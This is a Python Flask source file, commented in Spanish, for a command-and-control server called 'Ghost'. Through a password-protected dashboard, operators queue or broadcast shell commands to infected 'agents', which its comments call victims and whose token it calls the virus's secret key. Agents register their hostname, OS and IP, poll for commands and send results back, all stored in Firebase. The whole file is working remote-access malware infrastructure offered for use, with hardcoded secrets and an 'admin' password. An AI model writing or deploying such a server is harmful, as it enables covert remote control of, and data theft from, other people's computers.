from flask import Flask, render_template, request, jsonify, session, redirect, url_for
import os
import uuid
import json
from datetime import datetime
from functools import wraps
import firebase_admin
from firebase_admin import credentials, db
# import serverless_wsgi

# ...

# def handler(event, context):
#     return serverless_wsgi.handle_request(app, event, context)


app = Flask(__name__)
# Usamos una clave fija para que las sesiones no mueran al reiniciar el servidor en Netlify
app.secret_key = "GHOST_C2_ULTRA_SECRET_KEY_99" 

# --- CONFIGURACIÓN FIREBASE ---
# DEBES SUBIR TU ARCHIVO firebase-key.json AL DIRECTORIO RAÍZ
if not firebase_admin._apps:
    try:
        cred = credentials.Certificate("firebase-key.json")
        firebase_admin.initialize_app(cred, {
            'databaseURL': 'https://holaaa-2ca32-default-rtdb.europe-west1.firebasedatabase.app'
        })
    except Exception as e:
        print(f"Error cargando Firebase: {e}")

# CONFIGURACIÓN DE ACCESO
ADMIN_PASS = "admin"
AGENT_SECRET = "GHOST_SIGMA_99" # <--- llave secreta del virus

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if session.get('authenticated') is not True:
            return redirect(url_for('login_page'))
        return f(*args, **kwargs)
    return decorated_function

def require_agent_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if request.headers.get("X-Ghost-Token") != AGENT_SECRET:
            return jsonify({"status": "denied"}), 403
        return f(*args, **kwargs)
    return decorated

# --- RUTAS DE AUTENTICACIÓN ---

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    error = None
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASS:
            session['authenticated'] = True
            return redirect(url_for('dashboard_page'))
        else:
            error = "Contraseña Incorrecta"
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login_page'))

# --- RUTAS DEL PANEL (UI) ---

@app.route('/')
@login_required
def dashboard_page():
    return render_template('dashboard.html')

# --- API PARA EL PANEL (JS) ---

@app.route('/api/v1/agents', methods=['GET'])
@login_required
def api_get_agents():
    ref = db.reference('agents')
    agents = ref.get() or {}
    now = datetime.now()
    active_agents = {}
    
    for aid, data in agents.items():
        try:
            last_seen = datetime.fromisoformat(data.get('last_seen', '2000-01-01T00:00:00'))
            # Si lleva más de 60 segundos sin dar señales, lo borramos de Firebase
            if (now - last_seen).total_seconds() > 60:
                ref.child(aid).delete()
                # También borramos sus comandos y resultados para limpiar la DB
                db.reference(f'commands/{aid}').delete()
                # db.reference(f'results/{aid}').delete() # Opcional: mantener resultados
            else:
                active_agents[aid] = data
        except: pass
        
    return jsonify(active_agents)

@app.route('/api/v1/results/<agent_id>', methods=['GET'])
@login_required
def api_get_results(agent_id):
    return jsonify(db.reference(f'results/{agent_id}').get() or {})

@app.route('/api/v1/command', methods=['POST'])
@login_required
def api_send_command():
    data = request.json
    agent_id = data.get('id')
    cmd = data.get('command')
    
    if agent_id == "all" and cmd:
        # Broadcast mode
        ref = db.reference('agents')
        agents = ref.get() or {}
        count = 0
        for aid in agents.keys():
            db.reference(f'commands/{aid}').push({"cmd": cmd, "time": datetime.now().isoformat()})
            # Log en cada agente para que se vea en su historial individual
            db.reference(f'results/{aid}').push({
                "result": f"[BROADCAST] > {cmd}", 
                "timestamp": datetime.now().strftime("%H:%M:%S")
            })
            count += 1
        return jsonify({"status": "broadcast_sent", "count": count})

    if agent_id and cmd:
        # 1. Enviar comando a la cola del agente
        db.reference(f'commands/{agent_id}').push({"cmd": cmd, "time": datetime.now().isoformat()})
        
        # 2. Registrar comando en el historial visual (resultados) para que se vea en el chat
        db.reference(f'results/{agent_id}').push({
            "result": f"> {cmd}", 
            "timestamp": datetime.now().strftime("%H:%M:%S")
        })
        return jsonify({"status": "queued"})
    return jsonify({"status": "error"}), 400

@app.route('/api/v1/clear/<agent_id>', methods=['POST'])
@login_required
def api_clear_logs(agent_id):
    db.reference(f'results/{agent_id}').delete()
    return jsonify({"status": "cleared"})

# --- API PARA EL AGENTE (VÍCTIMA) ---

@app.route('/api/v1/agent/register', methods=['POST'])
@require_agent_auth
def agent_register():
    data = request.json
    agent_id = data.get('id')
    db.reference(f'agents/{agent_id}').update({
        "hostname": data.get('hostname'),
        "os": data.get('os'),
        "ip": request.remote_addr,
        "last_seen": datetime.now().isoformat()
    })
    return jsonify({"status": "ok"})

@app.route('/api/v1/agent/command/<agent_id>', methods=['GET'])
@require_agent_auth
def agent_get_command(agent_id):
    ref = db.reference(f'commands/{agent_id}')
    cmds = ref.get()
    if cmds:
        first_key = next(iter(cmds))
        command_body = cmds[first_key]
        ref.child(first_key).delete() # Borrar tras entregar
        return jsonify({"command": command_body['cmd']})
    return jsonify({"command": None})

@app.route('/api/v1/agent/result', methods=['POST'])
@require_agent_auth
def agent_post_result():
    data = request.json
    agent_id = data.get('id')
    db.reference(f'results/{agent_id}').push({
        "result": data.get('result'),
        "timestamp": datetime.now().strftime("%H:%M:%S")
    })
    return jsonify({"status": "received"})

# --- NETLIFY HANDLER ---
# def handler(event, context):
#     return serverless_wsgi.handle_request(app, event, context)


if __name__ == '__main__':
    app.run(debug=True, port=5000)
